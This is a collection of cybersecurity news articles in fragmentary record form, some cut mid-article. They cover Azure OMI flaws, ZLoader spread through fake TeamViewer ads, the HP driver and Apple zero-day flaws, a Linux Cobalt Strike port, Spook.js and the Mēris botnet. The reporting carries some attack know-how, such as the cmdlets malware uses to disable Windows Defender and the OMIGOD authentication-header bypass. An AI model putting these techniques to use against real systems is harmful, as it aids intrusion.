'text': 'Microsoft on Wednesday announced a new passwordless mechanism that allows users to access their accounts without a password by using Microsoft Authenticator, Windows Hello, a security key, or a verification code sent via SMS or email.\nThe change is expected to be rolled out in the coming weeks.\n“Except for auto-generated passwords that are nearly impossible to remember, we largely create our own passwords,“ said Vasu Jakkal, Microsoft’s corporate vice president for Security, Compliance, and Identity. “But, given the vulnerability of passwords, requirements for them have gotten increasingly complex in recent years, including multiple symbols, numbers, case sensitivity, and disallowing previous passwords.“\n\n“Passwords are incredibly inconvenient to create, remember, and manage across all the accounts in our lives,“ Jakkal added.\nOver the years, weak passwords have emerged as the entry point for a vast majority of attacks across enterprise and consumer accounts, so much so that Microsoft said there are about 579 password attacks every second, translating to a whopping 18 billion every year.\n\nThe situation has also been exacerbated by the need to create passwords that are not only secure but are also easy to remember, often resulting in users reusing the same password for multiple accounts or relying on easy-to-guess passwords, ultimately making them vulnerable to brute-force password spraying attacks.\n\nJakkal notes that 15% of people use their pets’ names for password inspiration, not to mention utilize family names and important dates like birthdays, with others banking on a formula for their passwords — “like Fall2021, which eventually becomes Winter2021 or Spring2022.“\nBy dropping passwords out of the equation, the idea is to make it difficult for malicious actors to gain access to an account by leveraging a combination of factors such as your phone (something you have) and biometrics (something you are) for identification.\nCustomers can use the new feature to sign in to Microsoft services such as Microsoft 365, Teams, Outlook, OneDrive, and Family Safety, but after linking their personal accounts to an authenticator app like Microsoft Authenticator, and turning on the “Passwordless Account“ setting under Advanced Security Options > Additional Security Options.\n\n\nFound this article interesting?

{'title': 'Critical Flaws Discovered in Azure App That Microsoft Secretly Installs on Linux VMs',
'text': 'Microsoft on Tuesday addressed a quartet of security flaws as part of its Patch Tuesday updates that could be abused by adversaries to target Azure cloud customers and elevate privileges as well as allow for remote takeover of vulnerable systems.\nThe list of flaws, collectively called OMIGOD by researchers from Wiz, affect a little-known software agent called Open Management Infrastructure that’s automatically deployed in many Azure services -\nCVE-2021-38647 (CVSS score: 9.8) - Open Management Infrastructure Remote Code Execution VulnerabilityCVE-2021-38648 (CVSS score: 7.8) - Open Management Infrastructure Elevation of Privilege VulnerabilityCVE-2021-38645 (CVSS score: 7.8) - Open Management Infrastructure Elevation of Privilege VulnerabilityCVE-2021-38649 (CVSS score: 7.0) - Open Management Infrastructure Elevation of Privilege Vulnerability\nOpen Management Infrastructure (OMI) is an open-source analogous equivalent of Windows Management Infrastructure (WMI) but designed for Linux and UNIX systems such as CentOS, Debian, Oracle Linux, Red Hat Enterprise Linux Server, SUSE Linux, and Ubuntu that allows for monitoring, inventory management, and syncing configurations across IT environments.\nAzure customers on Linux machines, including users of Azure Automation, Azure Automatic Update, Azure Operations Management Suite (OMS), Azure Log Analytics, Azure Configuration Management, and Azure Diagnostics, are at risk of potential exploitation.\n\n“When users enable any of these popular services, OMI is silently installed on their virtual machine, running at the highest privileges possible,“ Wiz security researcher Nir Ohfeld said. “This happens without customers’ explicit consent or knowledge. Users simply click agree to log collection during set-up and they have unknowingly opted in.“\n“In addition to Azure cloud customers, other Microsoft customers are affected since OMI can be independently installed on any Linux machine and is frequently used on-premise,“ Ohfeld added.\nSince the OMI agent runs as root with the highest privileges, the aforementioned vulnerabilities could be abused by external actors or low-privileged users to remotely execute code on target machines and escalate privileges, thereby enabling the threat actors to take advantage of the elevated permissions to mount sophisticated attacks.\n\nThe most critical of the four flaws is a remote code execution flaw arising out of an internet-exposed HTTPS port like 5986, 5985, or 1270, allowing attackers to obtain initial access to a target Azure environment and subsequently move laterally within the network.\n“This is a textbook RCE vulnerability that you would expect to see in the 90’s – it’s highly unusual to have one crop up in 2021 that can expose millions of endpoints,“ Ohfeld said. “With a single packet, an attacker can become root on a remote machine by simply removing the authentication header. It’s that simple.“\n“OMI is just one example of a ’secret’ software agent that’s pre-installed and silently deployed in cloud environments. It’s important to note that these agents exist not just in Azure but in [Amazon Web Services] and [Google Cloud Platform] as well.“\nUpdate: Microsoft on Thursday published additional guidance for the OMIGOD vulnerabilities, urging customers to apply the updates manually as and when they become available per the schedule outlined here. The security issues impact all versions of OMI below 1.6.8-1.\n“Several Azure Virtual Machine (VM) management extensions use [the OMI] framework to orchestrate configuration management and log collection on Linux VMs,“ Microsoft Security Response Center said in a bulletin. “The remote code execution vulnerability only impacts customers using a Linux management solution (on-premises SCOM or Azure Automation State Configuration or Azure Desired State Configuration extension) that enables remote OMI management.“\nThe development comes as Bad Packets reported mass scanning of Azure Linux-based servers vulnerable to the remote code execution flaw in an attempt to hijack vulnerable systems and mount further attacks, which, in turn, have been fueled by the public release of a proof-of-concept (PoC) exploit.\n\n\n\nFound this article interesting?

{'title': '3 Former U.S. Intelligence Officers Admit to Hacking for UAE Company',
'text': 'The U.S. Department of Justice (DoJ) on Tuesday disclosed it fined three intelligence community and military personnel $1.68 million in penalties for their role as cyber-mercenaries working on behalf of a U.A.E.-based cybersecurity company.\nThe trio in question — Marc Baier, 49, Ryan Adams, 34, and Daniel Gericke, 40 — are accused of “knowingly and willfully combine, conspire, confederate, and agree with each other to commit offenses, “furnishing defense services to persons and entities in the country over a three year period beginning around December 2015 and continuing through November 2019, including developing invasive spyware capable of breaking into mobile devices without any action by the targets.\n“The defendants worked as senior managers at a United Arab Emirates (U.A.E.)-based company (U.A.E. CO) that supported and carried out computer network exploitation (CNE) operations (i.e., ’hacking’) for the benefit of the U.A.E. government,“ the DoJ said in a statement.\n\n“Despite being informed on several occasions that their work for [the] U.A.E. CO, under the International Traffic in Arms Regulations (ITAR), constituted a ’defense service’ requiring a license from the State Department’s Directorate of Defense Trade Controls (DDTC), the defendants proceeded to provide such services without a license.“\nBesides charging the individuals for violations of U.S. export control, computer fraud and access device fraud laws, the hackers-for-hire are alleged to have supervised the creation of sophisticated ’zero-click’ exploits that were subsequently weaponized to illegally amass credentials for online accounts issued by U.S. companies, and to obtain unauthorized access to mobile phones around the world.\nThe development follows a prior investigation by Reuters in 2019, which revealed how former U.S. National Security Agency (NSA) operatives helped the U.A.E. surveil prominent Arab media figures, dissidents, and several unnamed U.S. journalists as part of a clandestine operation dubbed Project Raven undertaken by a cybersecurity company named DarkMatter. The company’s propensity to recruit “cyberwarriors from abroad“ to research offensive security techniques first came to light in 2016.\nThe deep-dive report also detailed a zero-click exploit called Karma that made it possible to remotely hack into iPhones of activists, diplomats and rival foreign leaders “simply by uploading phone numbers or email accounts into an automated targeting system.“ The sophisticated tool was used to retrieve photos, emails, text messages and location information from the victims’ phones as well as harvest saved passwords, which could be abused to stage further intrusions.\nAccording to unsealed court documents, Baier, Adams and Gericke designed, implemented, and used Karma for foreign intelligence gathering purposes starting in May 2016 after obtaining an exploit from an unnamed U.S. company that granted zero-click remote access to Apple devices. But after the underlying security weakness was plugged in September, the defendants allegedly contacted another U.S. firm to acquire a second exploit that utilized a different vulnerability in iOS, ultimately using it to rearchitect and modify the Karma exploitation toolkit.\n\nThe charges also arrive a day after Apple divulged that it acted to close a zero-day vulnerability (CVE-2021-30860) exploited by NSO Group’s Pegasus spyware to target activists in Bahrain and Saudi Arabia.\n“The FBI will fully investigate individuals and companies that profit from illegal criminal cyber activity,“ said Assistant Director Bryan Vorndran of the FBI’s Cyber Division. “This is a clear message to anybody, including former U.S. government employees, who had considered using cyberspace to leverage export-controlled information for the benefit of a foreign government or a foreign commercial company – there is risk, and there will be consequences.“\nUpdate: A new report from MIT Technology Review has now revealed that the vulnerability that the KARMA platform leveraged to take full control of a target’s iPhone was in Apple’s iMessage app and that the exploit was developed and sold by an American company named Accuvant, which has since merged with Optiv.\n“Accuvant sold hacking exploits to multiple customers in both governments and the private sector, including the United States and its allies — and this exact iMessage exploit was also sold simultaneously to multiple other customers,“ the report said.\nIn a separate development, VPN provider ExpressVPN said it was aware of Daniel Gericke’s previous employment before hiring him. Gericke, who is currently the Chief Information Officer at the company, is one the three individuals who have been implicated for their unlicensed work as mercenary hackers directing U.A.E.-funded intrusion campaigns.\n“We’ve known the key facts relating to Daniel’s employment history since before we hired him, as he disclosed them proactively and transparently with us from the start,“ the company said in a statement. “In fact, it was his history and expertise that made him an invaluable hire for our mission to protect users’ privacy and security.“\n\n\nFound this article interesting?

{'title': 'Download the Essential Guide to Response Automation',
'text': 'In the classic children’s movie ’The Princess Bride,’ one of the characters utters the phrase, “You keep using that word. I do not think it means what you think it means.“\nIt’s freely used as a response to someone’s misuse or misunderstanding of a word or phrase.\n\n“Response Automation“ is another one of those phrases that have different meanings to different people. It’s bantered around by the security vendor community so much that its precise meaning, when used, is unclear.\nMany vendors throw the term out without explaining exactly what they mean by the phrase. One vendor’s response automation might, and often do, perform very differently from another vendor’s response automation capabilities. But, hey, they have “response automation!“\nA recently published guide is meant to make sense of Response Automation (Download here). It discusses the evolution of response automation and distinguishes five increasingly capable levels of response automation available today. The guide will help you understand exactly what is meant when someone offers response automation, as well as the questions to ask to help clear up any confusion.\nThe five progressive levels of response automation\nThe guide also shares the types of security solutions that provide the varying levels of response automation, including Next-Generation Antivirus (NGAV), Endpoint Detection and Response (EDR), Extended Detection and Response (EDR) and Security Orchestration, Automation and Response (SOAR).\nThe capabilities of each solution category are quite different, which directly impacts each’s the ability to provide sophisticated response automation features. \nThe Five Levels of Response Automation\nAs depicted in the chart above, Cynet frames the five increasingly capable levels of response automation, along with the specific benefits provided by each. The most basic type of response automation involves remediating a specific threat in response to an alert on an endpoint. This, Cynet says, is table stakes for any threat detection and response (TDR) solution.\nThe ultimate level of response automation involves moving beyond remediation actions to include fully automated investigatory steps to determine if a detected threat actually part of a larger attack and, if so, uncovering related attack components. When a threat is detected, the automated investigation uncovers the root cause of the threat - how did the threat come to be in the environment.\nAs components of an attack are uncovered, an automated investigation can search the environment to expose the full scope of the attack. And, of course, appropriate remediation actions are taken at every step to eradicate all attack components.\nThe Real Meaning of Response Automation\nThe security community is very aware of the talent shortage and the ongoing pressures of “alert overload.“ It only makes sense that the more we can take off the plate of security professionals, the better things would be. Better in what way?\nFirst, automating repetitive and more pedestrian tasks would free up significant time for security staff to focus on more important items. And maybe reducing the time required to chase alerts precludes the need for additional staff.\nSecond, speeding up threat response to machine time reduces the likelihood that the threat may proliferate or cause immediate damage. Response automation at a minimum provides a healthy head start for security analysts in their threat response workflow.\nFor those of you that would welcome a tool to help improve security while reducing manual effort - let’s turn to another famous quote from The Princess Bride - “As you wish.“\nDownload the essential guide for Response Automation here\n\n\nFound this article interesting?

'text': 'Users searching for TeamViewer remote desktop software on search engines like Google are being redirected to malicious links that drop ZLoader malware onto their systems while simultaneously embracing a stealthier infection chain that allows it to linger on infected devices and evade detection by security solutions.\n“The malware is downloaded from a Google advertisement published through Google Adwords,“ researchers from SentinelOne said in a report published on Monday. “In this campaign, the attackers use an indirect way to compromise victims instead of using the classic approach of compromising the victims directly, such as by phishing.“\n\nFirst discovered in 2016, ZLoader (aka Silent Night and ZBot) is a fully-featured banking trojan and a fork of another banking malware called ZeuS, with newer versions implementing a VNC module that grants adversaries remote access to victim systems. The malware is in active development, with criminal actors spawning an array of variants in recent years, no less fuelled by the leak of ZeuS source code in 2011.\nThe latest wave of attacks is believed to target users of Australian and German financial institutions with the primary goal of intercepting users’ web requests to the banking portals and stealing bank credentials. But the campaign is also noteworthy because of the steps it takes to stay under the radar, including running a series of commands to hide the malicious activity by disabling Windows Defender.\n\nThe infection chain commences when a user clicks on an advertisement shown by Google on the search results page and is redirected to the fake TeamViewer site under the attacker’s control, thus tricking the victim into downloading a rogue but signed variant of the software (“Team-Viewer.msi“). The fake installer acts as the first stage dropper to trigger a series of actions that involve downloading next-stage droppers aimed at impairing the defenses of the machine and finally downloading the ZLoader DLL payload (“tim.dll“).\n\n“At first, it disables all the Windows Defender modules through the PowerShell cmdlet Set-MpPreference,“ SentinelOne Senior Threat Intelligence Researcher Antonio Pirozzi said. “It then adds exclusions, such as regsvr32, *.exe, *.dll, with the cmdlet Add-MpPreference to hide all the components of the malware from Windows Defender.“\nThe cybersecurity firm said it found additional artifacts that mimic popular apps like Discord and Zoom, suggesting that the attackers had multiple campaigns ongoing beyond leveraging TeamViewer.\n“The attack chain analyzed in this research shows how the complexity of the attack has grown in order to reach a higher level of stealthiness, using an alternative to the classic approach of compromising victims through phishing emails,“ Pirozzi explained. “The technique used to install the first stage dropper has been changed from socially engineering the victim into opening a malicious document to poisoning the user’s web searches with links that deliver a stealthy, signed MSI payload.“\n\n\nFound this article interesting?

{'title': 'HP OMEN Gaming Hub Flaw Affects Millions of Windows Computers',
'text': 'Cybersecurity researchers on Tuesday disclosed details about a high-severity flaw in the HP OMEN driver software that impacts millions of gaming computers worldwide, leaving them open to an array of attacks.\nTracked as CVE-2021-3437 (CVSS score: 7.8), the vulnerabilities could allow threat actors to escalate privileges to kernel mode without requiring administrator permissions, allowing them to disable security products, overwrite system components, and even corrupt the operating system.\nCybersecurity firm SentinelOne, which discovered and reported the shortcoming to HP on February 17, said it found no evidence of in-the-wild exploitation. The computer hardware company has since released a security update to its customers to address these vulnerabilities.\nThe issues themselves are rooted in a component called OMEN Command Center that comes pre-installed on HP OMEN-branded laptops and desktops and can also be downloaded from the Microsoft Store. The software, in addition to monitoring the GPU, CPU, and RAM via a vitals dashboard, is designed to help fine-tune network traffic and overclock the gaming PC for faster computer performance.\n\n“The problem is that HP OMEN Command Center includes a driver that, while ostensibly developed by HP, is actually a partial copy of another driver full of known vulnerabilities,“ SentinelOne researchers said in a report shared with The Hacker News.\n“In the right circumstances, an attacker with access to an organization’s network may also gain access to execute code on unpatched systems and use these vulnerabilities to gain local elevation of privileges. Attackers can then leverage other techniques to pivot to the broader network, like lateral movement.“\nThe driver in question is HpPortIox64.sys, which derives its functionality from OpenLibSys-developed WinRing0.sys — a problematic driver that emerged as the source of a local privilege escalation bug in EVGA Precision X1 software (CVE-2020-14979, CVSS score: 7.8) last year.\n“WinRing0 allows users to read and write to arbitrary physical memory, read and modify the model-specific registers (MSRs), and read/write to IO ports on the host,“ researchers from SpecterOps noted in August 2020. “These features are intended by the driver’s developers. However, because a low-privileged user can make these requests, they present an opportunity for local privilege escalation.“\nThe core issue stems from the fact that the driver accepts input/output control (IOCTL) calls without applying any kind of ACL enforcement, thus allowing bad actors unrestricted access to the aforementioned features, including capabilities to overwrite a binary that’s loaded by a privileged process and ultimately run code with elevated privileges.\n“To reduce the attack surface provided by device drivers with exposed IOCTLs handlers, developers should enforce strong ACLs on device objects, verify user input and not expose a generic interface to kernel mode operations,“ the researchers said.\n\nThe findings mark the second time WinRing0.sys has come under the lens for causing security issues in HP products.\nIn October 2019, SafeBreach Labs revealed a critical vulnerability in HP Touchpoint Analytics software (CVE-2019-6333), which comes included with the driver, thus potentially allowing threat actors to leverage the component to read arbitrary kernel memory and effectively allowlist malicious payloads via a signature validation bypass.\nFollowing the disclosure, enterprise firmware security company Eclypsium — as part of its “Screwed Drivers“ initiative to compile a repository of insecure drivers and shed light on how they can be abused by attackers to gain control over Windows-based systems — dubbed WinRing0.sys a “wormhole driver by design.“\nThe discovery is also the third in a series of security vulnerabilities affecting software drivers that have been uncovered by SentinelOne since the start of the year.\nEarlier this May, the Mountain View-based company revealed details about multiple privilege escalation vulnerabilities in Dell’s firmware update driver named “dbutil_2_3.sys“ that went undisclosed for more than 12 years. Then in July, it also made public a high-severity buffer overflow flaw impacting “ssport.sys“ and used in HP, Xerox, and Samsung printers that was found to have remained undetected since 2005.\n\n\nFound this article interesting?

{'title': 'Zero Trust Requires Cloud Data Security with Integrated Continuous Endpoint Risk Assessment',
'text': 'Every once in a while, an industry term will get overused by marketing to the point of becoming a cliche. “Zero Trust“ may have reached this threshold.\nIn some ways, we understand why this is happening. Security perimeters have become obsolete as people use mobile devices and cloud applications to work from anywhere. Zero Trust deployment — moving all your apps and data to the cloud and assuming no user or device is trustworthy until proven otherwise in order to gain access — has been rapidly introduced as a result of the pandemic.\nHowever, most attempts at achieving Zero Trust access today are a patchwork of disparate products from different vendors connected to virtual private networks (VPN), with rudimentary on-off access controls based on limited visibility.\nCloud security company, Lookout, believes a modern approach to Zero Trust needs to take into account the fact that data has moved to the cloud and users are working from anywhere, on any device, and connecting over their own network. \nLookout’s has announced its latest milestone — the expansion of Lookout Continuous Conditional Access (CCA) by integrating security and access platforms. This enables organizations to make detailed and ongoing risk assessments of endpoints and users, and apply that information to very granular access controls (as opposed to a simple yes-no access decision) that ensures business continues securely.\nTo see this in action, register for Lookout’s webinar on September 30th. Lookout will illustrate how integrating Mobile Endpoint Security, Cloud Access Security Broker (CASB) and Zero Trust Network Access (ZTNA) solutions to deliver a modern Zero Trust architecture.\nPandemic Response and the Current State of the Art\nMost of us are tired of talking about the impact of the pandemic, but it was a watershed event in remote working. Most organizations had to rapidly extend their existing enterprise apps to all their employees, remotely. And since many have already embraced the cloud and had a remote access strategy in place, typically a VPN, they simply extended what they had to all users.\nCEO’s and COO’s wanted this to happen quickly and securely, and Zero Trust was the buzzword that most understood as the right way to make this happen. So vendors all started to explain how their widget enabled Zero Trust or at least a part of it. \nBut remember, the idea of Zero Trust was conceived way back in 2014. A lot has changed over the last seven years. Apps and data that have moved to the cloud do not adhere to corporate domain-oriented or file-based access controls. Data is structured differently or unstructured. Communication and collaboration tools have evolved. And the endpoints people use are no longer limited to corporate-issued and managed domain-joined Windows laptops. Equally the types of attacks Lookout are trying to stop have evolved. So the concept of Zero Trust has also had to evolve as well.\nExtending VPNs was the default response to remote work and many organizations included it as part of their Zero Trust strategy. But bolting two-factor authentication and network access control (NAC) onto VPN is the opposite of least-privilege access. NAC is a 2-decade-old technology that only detects whether an endpoint is managed and has antivirus and VPNs that gives anyone that connects unlimited access.\nIt Starts with Better Telemetry\nMany access products on the market today check the security posture of users or endpoints at the moment they connect to the infrastructure. But that’s not enough. Just because a user remembers their password, provides a second factor of authentication, and uses a managed device with antivirus, doesn’t mean they are trustworthy.\nTo make smart access decisions that safeguard sensitive data and do not hinder productivity, you need deep visibility into all endpoints, data, and apps within your organization.\nDevice Telemetry:\nTo deploy a modern Zero Trust architecture, you need to track the constant change in risk levels of all user devices, including iOS, Android, and Chrome OS devices. These endpoints are the leading targets for advanced persistent threat (APT) reconnaissance and attacks that steal login credentials due to the effectiveness of mobile phishing.\nMobile devices are rarely connected to enterprise perimeter security as they are usually on cellular or public, or home Wi-Fi. They also frequently have OS and app vulnerabilities that open doors for exploitation and data leakage.\nUser Behavioral Analytics:\nUsers, in many ways, are just as complex and require continuous risk assessments. For example, it’s critical to understand typical user behavior for anomaly-based detection. Since access to all apps and data can occur over the Lookout platform, you can have an in-depth knowledge of a user and their usual activities.\nYou can use this to detect anomalous behavior that may indicate theft of their credentials or an insider threat and control access accordingly.\nData Sensitivity:\nContinuous assessment of your users and endpoints is essential. But the flip side of that is knowing the sensitivity of the data they access. To ensure your workers have what they need to stay productive while also safeguarding sensitive data, policy enforcement should be able to map risk with data sensitivity. \n>>> Check out Lookout CCA in action. \nLookout integrated them into a single platform\nBy integrating security and access platforms, Lookout is able to extend CCA and provide a modern approach to Zero Trust. With insights into endpoints, users, networks, apps, and data, to provide unprecedented visibility to organizations, enabling them to detect threats and anomalies, support compliance requirements effectively, and ultimately stop breaches.\n\nFrom an endpoint perspective, CCA enables your policies to take into account all the typical endpoint indicators such as malicious apps, compromised devices, phishing attacks, app and device vulnerabilities, and even risky apps. The access platform then adds indicators of anomalous user behavior such as large downloads, unusual access patterns, and unusual locations. And data loss prevention (DLP) capabilities enable us to assign sensitivity to what the user is attempting to do. \nAll of this telemetry can then be used to respond appropriately. Restrict access to sensitive data, request step-up authentication or take specific action on the content itself, such as masking or redacting certain keywords, applying encryption and adding watermarking. And in the event that what is occurring is a breach — you can shut down access altogether. \nAs an example: an employee who uses their personal smartphone for work may have a consumer app that has servers in a foreign location banned by regulations to hold certain data. Or maybe that user’s phone has an older operating system with known vulnerabilities.\nLookout CCA would be able to detect the app and the servers it connects to. The organization could write a policy that revokes download privileges for any endpoint with that risky app, so regulated data cannot be exfiltrated. Alternatively, the organization could dictate that any regulated data has to be encrypted by enterprise digital rights management (EDRM) so that even if they get downloaded or shared, only authenticated and authorized users can have access. \nLookout will also send remediation instructions to the user, telling them that they will regain access once they install the app.\nIn short, you are in complete control from endpoint to cloud. That’s the benefit of an integrated security and access platform, and that’s the way Lookout believes a modern Zero Trust architecture should be designed.\nTo learn more about Lookout’s endpoint-to-cloud solution, join their webinar.\n\n\nFound this article interesting?

The flaw has been addressed with improved memory management.CVE-2021-30860 (CoreGraphics) - An integer overflow vulnerability that could lead to arbitrary code execution when processing a maliciously crafted PDF document. The bug has been remediated with improved input validation.\n“Apple is aware of a report that this issue may have been actively exploited,“ the iPhone maker noted in its advisory.\n\nThe updates arrive weeks after researchers from the University of Toronto’s Citizen Lab revealed details of a zero-day exploit called “FORCEDENTRY“ (aka Megalodon) that was weaponized by Israeli surveillance vendor NSO Group and allegedly put to use by the government of Bahrain to install Pegasus spyware on the phones of nine activists in the country since February this year.\nBesides being triggered simply by sending a malicious message to the target, FORCEDENTRY is also notable for the fact that it expressly undermines a new software security feature called BlastDoor that Apple baked into iOS 14 to prevent zero-click intrusions by filtering untrusted data sent over iMessage.\n“Our latest discovery of yet another Apple zero day employed as part of NSO Group’s arsenal further illustrates that companies like NSO Group are facilitating ’despotism-as-a-service’ for unaccountable government security agencies,“ Citizen Lab researchers said.\n“Ubiquitous chat apps have become a major target for the most sophisticated threat actors, including nation state espionage operations and the mercenary spyware companies that service them. As presently engineered, many chat apps have become an irresistible soft target,“ they added.\nCitizen Lab said it found the never-before-seen malware on the phone of an unnamed Saudi activist, with the exploit chain kicking in when victims receive a text message containing a malicious GIF image that, in reality, are Adobe PSD (Photoshop Document files) and PDF files designed to crash the iMessage component responsible for automatically rendering images and deploy the surveillance tool.\nCVE-2021-30858, on the other hand, is the latest in a number of WebKit zero-day flaws Apple has rectified this year alone. With this set of latest updates, the company has patched a total of 15 zero-day vulnerabilities since the start of 2021.\nApple iPhone, iPad, Mac, and Apple Watch users are advised to immediately update their software to mitigate any potential threats arising out of active exploitation of the flaws.\n\n\n\nFound this article interesting?

{'title': 'Linux Implementation of Cobalt Strike Beacon Targeting Organizations Worldwide',
'text': 'Researchers on Monday took the wraps off a newly discovered Linux and Windows re-implementation of Cobalt Strike Beacon that’s actively set its sights on government, telecommunications, information technology, and financial institutions in the wild.\nThe as-yet undetected version of the penetration testing tool — codenamed “Vermilion Strike“ — marks one of the rare Linux ports, which has been traditionally a Windows-based red team tool heavily repurposed by adversaries to mount an array of targeted attacks. Cobalt Strike bills itself as a “threat emulation software,“ with Beacon being the payload engineered to model an advanced actor and duplicate their post-exploitation actions.\n\n“The stealthy sample uses Cobalt Strike’s command-and-control (C2) protocol when communicating to the C2 server and has remote access capabilities such as uploading files, running shell commands and writing to files,“ Intezer researchers said in a report published today and shared with The Hacker News.\nThe Israeli cybersecurity company’s findings come from an artifact uploaded to VirusTotal on August 10 from Malaysia. As of writing, only two anti-malware engines flag the file as malicious.\n\nOnce installed, the malware runs itself in the background and decrypts the configuration necessary for the beacon to function, before fingerprinting the compromised Linux machine and establishing communications with a remote server over DNS or HTTP to retrieve base64-encoded and AES-encrypted instructions that allow it run arbitrary commands, write to files, and upload files back to the server.\n\nInterestingly, additional samples identified during the course of the investigation have shed light on the Windows variant of the malware, sharing overlaps in the functionality and the C2 domains used to remotely commandeer the hosts. Intezer also called out the espionage campaign’s limited scope, noting the malware’s use in specific attacks as opposed to large-scale intrusions, while also attributing it to a “skilled threat actor“ owing to the fact that Vermilion Strike has not been observed in other attacks to date.\nThis is far from the first time the legitimate security testing toolkit has been used to orchestrate attacks against a wide range of targets. Last month, U.S. security firm Secureworks detailed a spear-phishing campaign undertaken by a threat group tracked as Tin Woodlawn (aka APT32 or OceanLotus) that leveraged a customized and enhanced version of Cobalt Strike to evade security countermeasures in an attempt to steal intellectual property and trade secrets.\n“Vermilion Strike and other Linux threats remain a constant threat. The predominance of Linux servers in the cloud and its continued rise invites APTs to modify their toolsets in order to navigate the existing environment,“ the researchers said.\n\n\nFound this article interesting?

'text': 'A widely used NPM package called ’Pac-Resolver’ for the JavaScript programming language has been remediated with a fix for a high-severity remote code execution vulnerability that could be abused to run malicious code inside Node.js applications whenever HTTP requests are sent. \nThe flaw, tracked as CVE-2021-23406, has a severity rating of 8.1 on the CVSS vulnerability scoring system and affects Pac-Resolver versions before 5.0.0.\n\nA Proxy Auto-Configuration (PAC) file is a JavaScript function that determines whether web browser requests should be routed directly to the destination or forwarded to a web proxy server for a given hostname. PAC files are how proxy rules are distributed in enterprise environments.\n“This package is used for PAC file support in Pac-Proxy-Agent, which is used in turn in Proxy-Agent, which then used all over the place as the standard go-to package for HTTP proxy auto-detection and configuration in Node.js,“ Tim Perry said in a write-up published late last month. “It’s very popular: Proxy-Agent is used everywhere from AWS’s CDK toolkit to the Mailgun SDK to the Firebase CLI.“\nCVE-2021-23406 has to do with how Pac-Proxy-Agent doesn’t sandbox PAC files correctly, resulting in a scenario where an untrusted PAC file can be abused to break out of the sandbox entirely and run arbitrary code on the underlying operating system. This, however, necessitates that the attacker either resides on the local network, has the capability to tamper with the contents of the PAC file, or chains it with a second vulnerability to alter the proxy configuration.\n\n“This is a well-known attack against the VM module, and it works because Node doesn’t isolate the context of the ’sandbox’ fully, because it’s not really trying to provide serious isolation,“ Perry said. “The fix is simple: use a real sandbox instead of the VM built-in module.“\nRed Hat, in an independent advisory, said the vulnerable package is shipped with its Advanced Cluster Management for Kubernetes product, but noted it’s “currently not aware of the vector to trigger the vulnerability in the affected component, furthermore the affected component is protected by user authentication lowering the potential impact of this vulnerability.“\n\n\nFound this article interesting?

{'title': 'New SpookJS Attack Bypasses Google Chrome’s Site Isolation Protection',
'text': 'A newly discovered side-channel attack demonstrated on modern processors can be weaponized to successfully overcome Site Isolation protections weaved into Google Chrome and Chromium browsers and leak sensitive data in a Spectre-style speculative execution attack.\nDubbed “Spook.js“ by academics from the University of Michigan, University of Adelaide, Georgia Institute of Technology, and Tel Aviv University, the technique is a JavaScript-based line of attack that specifically aims to get around barriers Google put in place to potentially prevent leakage by ensuring that content from different domains is not shared in the same address space after Spectre and Meltdown vulnerabilities came to light in January 2018.\n\n“An attacker-controlled webpage can know which other pages from the same websites a user is currently browsing, retrieve sensitive information from these pages, and even recover login credentials (e.g., username and password) when they are autofilled,“ the researchers said, adding “the attacker can retrieve data from Chrome extensions (such as credential managers) if a user installs a malicious extension.“\nAs a consequence, any data stored in the memory of a website being rendered or a Chrome extension can be extracted, including personally identifiable information displayed on the website, and auto-filled usernames, passwords, and credit card numbers.\nSpectre, designated as CVE-2017-5753 and CVE-2017-5715, refers to a class of hardware vulnerabilities in CPUs that breaks the isolation between different applications and permits attackers to trick a program into accessing arbitrary locations associated with its memory space, abusing it to read the content of accessed memory, and thus potentially obtain sensitive data.\n“These attacks use the speculative execution features of most CPUs to access parts of memory that should be off-limits to a piece of code, and then use timing attacks to discover the values stored in that memory,“ Google noted. “Effectively, this means that untrustworthy code may be able to read any memory in its process’s address space.“\n\nSite Isolation, rolled out in July 2018, is Google’s software countermeasure designed to make the attacks harder to exploit, among others that involve reducing timer granularity. With the feature enabled, Chrome browser versions 67 and above will load each website in its own process, and as a result, thwart attacks between processes, and thus, between sites.\nHowever, researchers of the latest study found scenarios where the site isolation safeguards do not separate two websites, effectively undermining Spectre protections. Spook.js exploits this design quirk to result in information leakage from Chrome and Chromium-based browsers running on Intel, AMD, and Apple M1 processors.\n\n“Thus, Chrome will separate ’example.com’ and ’example.net’ due to different [top-level domains], and also ’example.com’ and ’attacker.com.’“ the researchers explained. “However, ’attacker.example.com’ and ’corporate.example.com’ are allowed to share the same process [and] this allows pages hosted under ’attacker.example.com’ to potentially extract information from pages under ’corporate.example.com.’“\n“Spook.js shows that these countermeasures are insufficient in order to protect users from browser-based speculative execution attacks,“ the researchers added. That said, as with other Spectre variants, exploiting Spook.js is difficult, requiring substantial side-channel expertise on the part of the attacker.\n\nIn response to the findings, the Chrome Security Team, in July 2021, extended Site Isolation to ensure that “extensions can no longer share processes with each other,“ in addition to applying them to “sites where users log in via third-party providers.“ The new setting, called Strict Extension Isolation, is enabled as of Chrome versions 92 and up.\n “Web developers can immediately separate untrusted, user-supplied JavaScript code from all other content for their website, hosting all user-supplied JavaScript code at a domain that has a different eTLD+1,“ the researchers said. “This way, Strict Site Isolation will not consolidate attacker-supplied code with potentially sensitive data into the same process, putting the data out of reach even for Spook.js as it cannot cross process boundaries.“\n\n\nFound this article interesting?

'text': 'Russian internet giant Yandex has been the target of a record-breaking distributed denial-of-service (DDoS) attack by a new botnet called Mēris.\nThe botnet is believed to have pummeled the company’s web infrastructure with millions of HTTP requests, before hitting a peak of 21.8 million requests per second (RPS), dwarfing a recent botnet-powered attack that came to light last month, bombarding an unnamed Cloudflare customer in the financial industry with 17.2 million RPS.\nRussian DDoS mitigation service Qrator Labs, which disclosed details of the attack on Thursday, called Mēris — meaning “Plague“ in the Latvian language — a “botnet of a new kind.“ \n\n“It is also clear that this particular botnet is still growing. There is a suggestion that the botnet could grow in force through password brute-forcing, although we tend to neglect that as a slight possibility. That looks like some vulnerability that was either kept secret before the massive campaign’s start or sold on the black market,“ the researchers noted, adding Mēris “can overwhelm almost any infrastructure, including some highly robust networks […] due to the enormous RPS power that it brings along.“\nThe DDoS attacks leveraged a technique called HTTP pipelining that allows a client (i.e., a web browser) to open a connection to the server and make multiple requests without waiting for each response. The malicious traffic originated from over 250,000 infected hosts, primarily network devices from Mikrotik, with evidence pointing to a spectrum of RouterOS versions that have been weaponized by exploiting as-yet-unknown vulnerabilities.\nBut in a forum post, the Latvian network equipment manufacturer said these attacks employ the same set of routers that were compromised via a 2018 vulnerability (CVE-2018-14847, CVSS score: 9.1) that has since been patched and that there are no new (zero-day) 